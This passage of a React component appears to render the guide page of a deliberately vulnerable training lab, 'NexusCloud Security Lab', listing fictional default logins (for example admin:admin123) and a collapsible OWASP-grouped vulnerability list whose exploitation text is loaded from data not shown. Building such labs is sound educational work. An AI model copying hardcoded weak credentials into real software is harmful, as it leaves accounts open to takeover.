          <div className="flex-1 rounded-lg border border-emerald-900/50 bg-emerald-950/20 p-4">
            <p className="text-[10px] uppercase tracking-wider text-emerald-600">Easy</p>
            <p className="mt-1 text-xl font-bold text-emerald-400">{countByDiff.Easy}</p>
          </div>
          <div className="flex-1 rounded-lg border border-amber-900/50 bg-amber-950/20 p-4">
            <p className="text-[10px] uppercase tracking-wider text-amber-600">Medium</p>
            <p className="mt-1 text-xl font-bold text-amber-400">{countByDiff.Medium}</p>
          </div>
          <div className="flex-1 rounded-lg border border-red-900/50 bg-red-950/20 p-4">
            <p className="text-[10px] uppercase tracking-wider text-red-600">Hard</p>
            <p className="mt-1 text-xl font-bold text-red-400">{countByDiff.Hard}</p>
          </div>
        </div>

        {/* Default Credentials */}
        <div className="rounded-lg border border-indigo-900/50 bg-indigo-950/20 p-5">
          <h3 className="text-sm font-semibold text-indigo-300 mb-3">Default Credentials</h3>
          <div className="grid grid-cols-2 gap-2 text-xs font-mono">
            <div className="rounded bg-gray-900/80 px-3 py-2">
              <span className="text-gray-500">admin:</span> <span className="text-indigo-400">admin123</span>
              <span className="ml-2 text-gray-600">(admin · Acme Corp)</span>
            </div>
            <div className="rounded bg-gray-900/80 px-3 py-2">
              <span className="text-gray-500">manager1:</span> <span className="text-indigo-400">manager123</span>
              <span className="ml-2 text-gray-600">(manager · Acme Corp)</span>
            </div>
            <div className="rounded bg-gray-900/80 px-3 py-2">
              <span className="text-gray-500">jsmith:</span> <span className="text-indigo-400">password123</span>
              <span className="ml-2 text-gray-600">(user · Acme Corp)</span>
            </div>
            <div className="rounded bg-gray-900/80 px-3 py-2">
              <span className="text-gray-500">mike_ops:</span> <span className="text-indigo-400">mike2024</span>
              <span className="ml-2 text-gray-600">(user · Acme Corp)</span>
            </div>
            <div className="rounded bg-gray-900/80 px-3 py-2">
              <span className="text-gray-500">emily_r:</span> <span className="text-indigo-400">emily2024</span>
              <span className="ml-2 text-gray-600">(user · DevStudio · <span className="text-amber-400">private</span>)</span>
            </div>
            <div className="rounded bg-gray-900/80 px-3 py-2">
              <span className="text-gray-500">alex_dev:</span> <span className="text-indigo-400">alexpass</span>
              <span className="ml-2 text-gray-600">(user · DevStudio)</span>
            </div>
            <div className="rounded bg-gray-900/80 px-3 py-2">
              <span className="text-gray-500">lisa_m:</span> <span className="text-indigo-400">lisa2024</span>
              <span className="ml-2 text-gray-600">(user · DevStudio)</span>
            </div>
            <div className="rounded bg-gray-900/80 px-3 py-2">
              <span className="text-gray-500">guest:</span> <span className="text-indigo-400">guest123</span>
              <span className="ml-2 text-gray-600">(guest · Freelance Hub)</span>
            </div>
          </div>
        </div>

        {/* Vulnerability List by OWASP Category */}
        <div className="space-y-4">
          {grouped.map(({ category, vulns }) => (
            <div key={category} className="rounded-xl border border-gray-800 bg-[#0f0f18] overflow-hidden">
              <button
                onClick={() => toggleCategory(category)}
                className="flex w-full items-center justify-between px-5 py-4 text-left hover:bg-gray-800/50 transition-colors"
              >
                <div className="flex items-center gap-3">
                  {expanded[`cat_${category}`]
                    ? <ChevronDown className="h-4 w-4 text-gray-500" />
                    : <ChevronRight className="h-4 w-4 text-gray-500" />}
                  <h2 className="text-sm font-semibold text-white">{category}</h2>
                  <span className="rounded-full bg-gray-800 px-2 py-0.5 text-[10px] text-gray-400">
                    {vulns.length}
                  </span>
                </div>
              </button>

              {expanded[`cat_${category}`] && (
                <div className="border-t border-gray-800 divide-y divide-gray-800/50">
                  {vulns.map(v => (
                    <div key={v.id} className="px-5">
                      <button
                        onClick={() => toggle(v.id)}
                        className="flex w-full items-center gap-3 py-3 text-left"
                      >
                        {expanded[v.id]
                          ? <ChevronDown className="h-3.5 w-3.5 shrink-0 text-gray-500" />
                          : <ChevronRight className="h-3.5 w-3.5 shrink-0 text-gray-500" />}
                        <span className="shrink-0 rounded bg-gray-800 px-1.5 py-0.5 font-mono text-[10px] text-gray-500">
                          {v.id}
                        </span>
                        <span className="flex-1 text-sm text-gray-200">{v.title}</span>
                        <span className={`shrink-0 rounded-full border px-2 py-0.5 text-[10px] font-medium ${difficultyColor[v.difficulty]}`}>
                          {v.difficulty}
                        </span>
                      </button>

                      {expanded[v.id] && (
                        <div className="ml-8 mb-4 space-y-4 text-xs">
                          <div>
                            <p className="font-semibold text-gray-400 mb-1">Location</p>
                            <p className="font-mono text-indigo-400 whitespace-pre-line">{v.location}</p>
                          </div>
                          <div>
                            <p className="font-semibold text-gray-400 mb-1">Endpoint</p>
                            <code className="rounded bg-gray-900 px-2 py-1 text-emerald-400">{v.endpoint}</code>
                          </div>
                          <div>
                            <p className="font-semibold text-gray-400 mb-1">Description</p>
                            <p className="text-gray-300 leading-relaxed">{v.description}</p>
                          </div>
                          <div>
                            <p className="font-semibold text-gray-400 mb-1">Exploitation Steps</p>
                            <pre className="whitespace-pre-wrap rounded-lg border border-gray-800 bg-gray-950 p-4 text-gray-300 leading-relaxed overflow-x-auto">
                              {v.exploitation}
                            </pre>
                          </div>
                          <div>
                            <p className="font-semibold text-gray-400 mb-1">Impact</p>
                            <p className="text-red-400">{v.impact}</p>
                          </div>
                        </div>
                      )}
                    </div>
                  ))}
                </div>
              )}
            </div>
          ))}
        </div>

        {/* Footer */}
        <div className="border-t border-gray-800 pt-6 pb-12 text-center text-xs text-gray-600">
          <p>NexusCloud Security Lab — For authorized security testing only.</p>
          <p className="mt-1">All vulnerabilities are intentional and exist for educational purposes.</p>
        </div>
      </div>
    </div>
  )
}
